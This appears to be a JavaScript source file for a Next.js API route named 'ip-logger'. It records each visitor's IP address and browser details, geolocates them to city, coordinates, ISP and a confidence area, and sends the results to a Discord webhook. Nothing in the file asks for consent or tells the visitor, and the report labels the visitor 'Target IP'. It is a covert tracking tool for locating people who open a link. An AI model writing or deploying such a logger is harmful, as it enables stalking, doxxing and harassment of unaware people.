// /pages/api/ip-logger.js - WITH SEPARATE CONFIDENCE MAP WEBHOOK
export default async function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();

  try {
    // --- Get Client IP ---
    let clientIP = (
      req.headers['x-forwarded-for'] ||
      req.headers['x-real-ip'] ||
      req.socket?.remoteAddress ||
      ''
    ).toString();
    if (!clientIP) clientIP = '0.0.0.0';
    if (clientIP.includes(',')) clientIP = clientIP.split(',')[0].trim();
    clientIP = clientIP.replace(/^::ffff:/, '');
    const userAgent = (req.headers['user-agent'] || 'Unknown').toString();

    console.log('DEBUG: Starting for IP:', clientIP);

    // --- API Key Check ---
    const KEY = process.env.BIGDATACLOUD_API_KEY;
    if (!KEY) {
      console.error('DEBUG: Missing BIGDATACLOUD_API_KEY');
      return res.status(500).json({ success: false, error: 'Missing BIGDATACLOUD_API_KEY' });
    }

    const BASE = 'https://api-bdc.net/data';
    
    // --- Fetch Main Geolocation Data ---
    const GEO_URL = `${BASE}/ip-geolocation-full?ip=${encodeURIComponent(clientIP)}&localityLanguage=en&key=${KEY}`;
    
    let ipData = {};
    try {
      const response = await fetch(GEO_URL);
      if (!response.ok) {
        console.error(`DEBUG: API error ${response.status}`);
        return res.status(502).json({ success: false, error: `API error: ${response.status}` });
      }
      
      const rawText = await response.text();
      ipData = JSON.parse(rawText);
      console.log('DEBUG: Main fetch OK, confidence:', ipData?.confidence);
    } catch (fetchError) {
      console.error('DEBUG: Fetch failed:', fetchError.message);
      return res.status(500).json({ success: false, error: 'Failed to fetch data' });
    }

    // --- Extract Main Data ---
    const latitude = ipData?.location?.latitude || null;
    const longitude = ipData?.location?.longitude || null;
    const continent = ipData?.location?.continent || 'Unknown';
    const region = ipData?.location?.principalSubdivision || 'Unknown';
    const city = ipData?.location?.city || 'Unknown';
    const locality = ipData?.location?.localityName || city;
    const country = ipData?.country?.name || 'Unknown';
    const countryCode = ipData?.country?.isoAlpha2 || 'Unknown';
    const isp = ipData?.network?.organisation || 'Unknown';
    const asnNumber = ipData?.network?.autonomousSystemNumber;
    const asn = asnNumber ? `AS${asnNumber}` : 'Unknown';
    const connectionType = ipData?.network?.connectionType || 'Unknown';
    const confidence = ipData?.confidence || 'unknown';
    const confidenceArea = ipData?.confidenceArea || null;
    const accuracyRadius = ipData?.location?.accuracyRadius || null;

    console.log('DEBUG: Confidence area exists:', !!confidenceArea);

    // --- ANALYZE CONFIDENCE AREA DATA ---
    let confidenceStats = {
      hasData: false,
      pointCount: 0,
      areaType: 'None',
      bounds: null,
      centerPoint: null,
      approxAreaKm: null
    };

    // Process confidence area polygon if it exists
    if (confidenceArea && Array.isArray(confidenceArea)) {
      confidenceStats.hasData = true;
      confidenceStats.pointCount = confidenceArea.length;
      confidenceStats.areaType = 'Polygon';
      
      // Calculate bounds (min/max lat/lon)
      let minLat = 90, maxLat = -90, minLon = 180, maxLon = -180;
      let sumLat = 0, sumLon = 0;
      
      confidenceArea.forEach(point => {
        if (Array.isArray(point) && point.length >= 2) {
          // BigDataCloud format: [longitude, latitude]
          const lon = point[0];
          const lat = point[1];
          
          minLat = Math.min(minLat, lat);
          maxLat = Math.max(maxLat, lat);
          minLon = Math.min(minLon, lon);
          maxLon = Math.max(maxLon, lon);
          
          sumLat += lat;
          sumLon += lon;
        }
      });
      
      confidenceStats.bounds = {
        minLat: minLat.toFixed(6),
        maxLat: maxLat.toFixed(6),
        minLon: minLon.toFixed(6),
        maxLon: maxLon.toFixed(6),
        latRange: (maxLat - minLat).toFixed(6),
        lonRange: (maxLon - minLon).toFixed(6)
      };
      
      // Calculate center point (average of all polygon points)
      if (confidenceStats.pointCount > 0) {
        confidenceStats.centerPoint = {
          lat: (sumLat / confidenceStats.pointCount).toFixed(6),
          lon: (sumLon / confidenceStats.pointCount).toFixed(6)
        };
        
        // Approximate area in square kilometers (simple rectangle approximation)
        const latKm = (maxLat - minLat) * 111.32; // 1 degree latitude ≈ 111.32 km
        const lonKm = (maxLon - minLon) * (111.32 * Math.cos((minLat + maxLat) * Math.PI / 360));
        confidenceStats.approxAreaKm = Math.abs(latKm * lonKm).toFixed(1);
      }
    }

    // --- Generate Confidence Area Visualization ---
    let confidenceMapUrl = null;
    if (confidenceArea && Array.isArray(confidenceArea) && confidenceArea.length > 0) {
      // Create GeoJSON for visualization
      const geoJson = {
        type: "FeatureCollection",
        features: [
          {
            type: "Feature",
            properties: {
              name: "IP Location",
              "marker-color": "#FF0000",
              "marker-size": "medium"
            },
            geometry: {
              type: "Point",
              coordinates: [longitude, latitude]
            }
          },
          {
            type: "Feature",
            properties: {
              name: "Confidence Area",
              stroke: "#0000FF",
              "stroke-width": 2,
              "stroke-opacity": 1,
              fill: "#0000FF",
              "fill-opacity": 0.1
            },
            geometry: {
              type: "Polygon",
              coordinates: [confidenceArea]
            }
          }
        ]
      };
      
      // URL encode for geojson.io
      const encodedGeoJson = encodeURIComponent(JSON.stringify(geoJson));
      confidenceMapUrl = `https://geojson.io/#data=data:application/json,${encodedGeoJson}`;
      console.log('DEBUG: Created confidence map URL');
    }

    // --- Simple Map URL (fallback) ---
    let simpleMapUrl = null;
    if (latitude && longitude) {
      simpleMapUrl = `https://www.google.com/maps?q=${latitude},${longitude}&z=12`;
    }

    // --- Build Data Objects ---
    const mainData = {
      ip: clientIP,
      timestamp: new Date().toISOString(),
      userAgent,
      location: {
        country,
        countryCode,
        region,
        city,
        locality,
        latitude,
        longitude,
        accuracyRadius,
        confidence
      },
      network: {
        isp,
        asn,
        connectionType
      },
      device: parseUserAgent(userAgent),
      maps: {
        simple: simpleMapUrl,
        confidence: confidenceMapUrl
      }
    };

    const confidenceData = {
      ip: clientIP,
      timestamp: new Date().toISOString(),
      confidenceLevel: confidence,
      confidenceArea: confidenceStats,
      visualizationUrl: confidenceMapUrl,
      rawPolygonSample: confidenceArea ? 
        confidenceArea.slice(0, 3).map(p => `[${p[0].toFixed(4)}, ${p[1].toFixed(4)}]`).join(', ') + (confidenceArea.length > 3 ? `... (+${confidenceArea.length - 3} more)` : '') : 
        'No polygon data'
    };

    console.log('DEBUG: Built confidence data:', confidenceStats);

    // --- Send Discord Webhooks ---
    const webhookResults = {
      main: { sent: false, error: null },
      confidence: { sent: false, error: null }
    };

    if (process.env.DISCORD_WEBHOOK_URL) {
      try {
        // Send MAIN webhook
        await sendMainWebhook(mainData);
        webhookResults.main.sent = true;
        console.log('DEBUG: Main webhook sent');
        
        // Send CONFIDENCE DETAILS webhook (only if we have confidence data)
        if (confidenceStats.hasData) {
          try {
            await sendConfidenceWebhook(confidenceData);
            webhookResults.confidence.sent = true;
            console.log('DEBUG: Confidence webhook sent');
          } catch (confError) {
            webhookResults.confidence.error = confError.message;
            console.error('DEBUG: Confidence webhook failed:', confError.message);
          }
        } else {
          console.log('DEBUG: No confidence data to send separate webhook');
        }
      } catch (mainError) {
        webhookResults.main.error = mainError.message;
        console.error('DEBUG: Main webhook failed:', mainError.message);
      }
    } else {
      console.warn('DEBUG: No DISCORD_WEBHOOK_URL set');
    }

    // --- Return Response ---
    return res.status(200).json({
      success: true,
      data: mainData,
      confidence: confidenceData,
      webhooks: webhookResults
    });

  } catch (err) {
    console.error('Handler error:', err);
    return res.status(500).json({ 
      success: false, 
      error: 'Internal server error',
      message: err.message 
    });
  }
}

// --- Helper Functions ---

function parseUserAgent(ua) {
  const s = (ua || '').toString();
  let browser = 'Unknown', os = 'Unknown', device = 'Desktop';
  
  if (/OPR|Opera/.test(s)) browser = 'Opera';
  else if (/Edg\//.test(s)) browser = 'Edge';
  else if (/Chrome\/\d+/i.test(s) && !/Edg\//i.test(s)) browser = 'Chrome';
  else if (/Firefox\/\d+/i.test(s)) browser = 'Firefox';
  else if (/Safari\/\d+/i.test(s) && !/Chrome\//i.test(s)) browser = 'Safari';
  
  if (/\bWindows\b/i.test(s)) os = 'Windows';
  else if (/\bMacintosh\b|\bMac OS\b/i.test(s)) os = 'Mac OS';
  else if (/\bAndroid\b/i.test(s)) os = 'Android';
  else if (/\b(iPhone|iPad|iPod)\b/i.test(s)) os = 'iOS';
  else if (/\bLinux\b/i.test(s)) os = 'Linux';
  
  if (/\bMobile\b/i.test(s) || (/Android/i.test(s) && /Mobile/i.test(s))) device = 'Mobile';
  else if (/\bTablet\b/i.test(s) || /iPad/i.test(s)) device = 'Tablet';
  
  return { browser, os, device, raw: s.substring(0, 150) };
}

// --- Webhook Functions ---

async function sendMainWebhook(data) {
  const webhook = process.env.DISCORD_WEBHOOK_URL;
  if (!webhook) throw new Error('Webhook URL not set');

  const embed = {
    embeds: [{
      title: '🌐 IP Location - Main Report',
      color: 0x3498db,
      timestamp: data.timestamp,
      fields: [
        { 
          name: '📍 IP Address', 
          value: `\`\`\`${data.ip}\`\`\``, 
          inline: false 
        },
        { 
          name: '🌍 Location', 
          value: `${data.location.country} (${data.location.countryCode})\n${data.location.region} / ${data.location.city}`,
          inline: true 
        },
        { 
          name: '📡 Network', 
          value: `**ISP:** ${data.network.isp}\n**ASN:** ${data.network.asn}\n**Type:** ${data.network.connectionType}`,
          inline: true 
        },
        { 
          name: '🎯 Coordinates', 
          value: `${data.location.latitude}, ${data.location.longitude}`,
          inline: true 
        },
        { 
          name: '📏 Accuracy', 
          value: data.location.accuracyRadius ? `${data.location.accuracyRadius} km` : 'N/A',
          inline: true 
        },
        { 
          name: '✅ Confidence Level', 
          value: data.location.confidence.toUpperCase(),
          inline: true 
        },
        { 
          name: '🖥️ Device', 
          value: `${data.device.browser} / ${data.device.os}`,
          inline: true 
        }
      ],
      footer: { 
        text: 'Main Report • See next message for confidence area details'
      }
    }]
  };

  // Add map link if available
  if (data.maps.simple) {
    embed.embeds[0].fields.push({
      name: '🗺️ Quick Map',
      value: `[Google Maps](${data.maps.simple})`,
      inline: true
    });
  }

  if (data.maps.confidence) {
    embed.embeds[0].fields.push({
      name: '📊 Confidence Map',
      value: `[Detailed View](${data.maps.confidence})`,
      inline: true
    });
  }

  const response = await fetch(webhook, { 
    method: 'POST', 
    headers: { 'Content-Type': 'application/json' }, 
    body: JSON.stringify(embed)
  });
  
  if (!response.ok) {
    const errorText = await response.text();
    throw new Error(`Discord API: ${response.status} - ${errorText}`);
  }
}

async function sendConfidenceWebhook(data) {
  const webhook = process.env.DISCORD_WEBHOOK_URL;
  if (!webhook) throw new Error('Webhook URL not set');

  const stats = data.confidenceArea;
  
  // Build detailed fields
  const fields = [
    { 
      name: '📍 Target IP', 
      value: `\`${data.ip}\``, 
      inline: false 
    },
    { 
      name: '🎯 Confidence Level', 
      value: `**${data.confidenceLevel.toUpperCase()}**`,
      inline: true 
    }
  ];

  if (stats.hasData) {
    fields.push(
      { 
        name: '📐 Polygon Shape', 
        value: `**Points:** ${stats.pointCount}\n**Type:** ${stats.areaType}`,
        inline: true 
      },
      { 
        name: '📏 Bounding Box', 
        value: `**Lat:** ${stats.bounds.minLat} → ${stats.bounds.maxLat} (Δ${stats.bounds.latRange}°)\n**Lon:** ${stats.bounds.minLon} → ${stats.bounds.maxLon} (Δ${stats.bounds.lonRange}°)`,
        inline: true 
      },
      { 
        name: '📍 Polygon Center', 
        value: `${stats.centerPoint.lat}, ${stats.centerPoint.lon}`,
        inline: true 
      },
      { 
        name: '📐 Approximate Area', 
        value: `${stats.approxAreaKm} km²`,
        inline: true 
      },
      { 
        name: '📋 Data Format', 
        value: 'GeoJSON Polygon\n[Longitude, Latitude] pairs',
        inline: true 
      }
    );
    
    // Add polygon sample
    fields.push({
      name: '📝 Polygon Sample (first 3 points)',
      value: `\`\`\`json\n${data.rawPolygonSample}\`\`\``,
      inline: false
    });
  } else {
    fields.push({
      name: '⚠️ Confidence Data',
      value: 'No confidence area polygon available for this IP address.',
      inline: false
    });
  }

  // Add visualization link if available
  if (data.visualizationUrl) {
    fields.push({
      name: '🗺️ Interactive Visualization',
      value: `[Click to view confidence area on geojson.io](${data.visualizationUrl})\n*Blue area shows possible location range*`,
      inline: false
    });
  }

  const embed = {
    embeds: [{
      title: '📊 Confidence Area Analysis',
      description: 'Detailed confidence polygon data showing the possible location range',
      color: 0x9b59b6, // Purple color for distinction
      timestamp: data.timestamp,
      fields: fields,
      footer: { 
        text: 'Confidence Analysis • Based on BigDataCloud confidenceArea polygon'
      }
    }]
  };

  const response = await fetch(webhook, { 
    method: 'POST', 
    headers: { 'Content-Type': 'application/json' }, 
    body: JSON.stringify(embed)
  });
  
  if (!response.ok) {
    const errorText = await response.text();
    throw new Error(`Discord API: ${response.status} - ${errorText}`);
  }
      }
